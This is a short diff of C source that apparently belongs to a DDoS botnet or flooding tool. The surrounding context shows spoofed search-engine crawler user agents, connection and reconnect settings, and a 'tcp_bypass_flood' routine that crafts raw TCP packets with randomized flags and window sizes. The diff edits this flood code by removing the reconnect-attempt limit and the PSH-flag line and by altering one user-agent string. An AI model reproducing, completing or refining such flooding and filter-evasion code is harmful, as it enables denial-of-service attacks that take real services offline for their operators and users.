@@ -37,7 +37,6 @@
 #define DEFAULT_DELAY 1
 #define SOCKETS_PER_THREAD 4
 #define RECONNECT_DELAY 5
-#define MAX_RECONNECT_ATTEMPTS 0
 
 static int sock = -1;
 static int running = 1;
@@ -103,7 +102,7 @@ const char *user_agents[] = {
     "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
     "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
     "Mozilla/5.0 (compatible; Facebookbot/1.0; +http://www.facebook.com/facebookbot)",
-    "Mozilla/5.0 (compatible; Twitterbot/1.0; +http://twitter.com/help/crawling)",
+    "Mozilla/5.0 (compatible; Twitterbot/1.0; +twitter.com/help/crawling)",
     "Mozilla/5.0 (compatible; Applebot/1.0; +http://www.apple.com/go/applebot)",
     "Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot)",
     "Mozilla/5.0 (compatible; SemrushBot/1.0; +http://www.semrush.com/bot.html)",
@@ -554,7 +553,6 @@ void *tcp_bypass_flood(void *arg) {
         if (flags[flag_index] & TH_ACK) tcp_header->ack = 1;
         if (flags[flag_index] & TH_FIN) tcp_header->fin = 1;
         if (flags[flag_index] & TH_RST) tcp_header->rst = 1;
-        if (flags[flag_index] & TH_PSH) tcp_header->psh = 1;
         
         tcp_header->window = htons(1024 + (rand() % 64511));
         tcp_header->check = 0;
